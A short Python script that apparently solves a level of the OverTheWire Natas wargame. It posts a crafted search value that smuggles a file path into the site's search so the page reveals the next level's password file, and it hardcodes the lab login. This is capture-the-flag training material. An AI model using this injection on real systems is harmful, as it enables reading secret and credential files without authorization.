import requests
import re

username = "natas16"
password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
url = f"http://{username}.natas.labs.overthewire.org/"

session = requests.Session()

response = session.post(url, auth=(username, password), data={'needle': '. %2F%2Fetc%2F%2Fnatas_webpass%2F%2Fnatas17', 'submit': 'submit'})

content = response.text

print(content)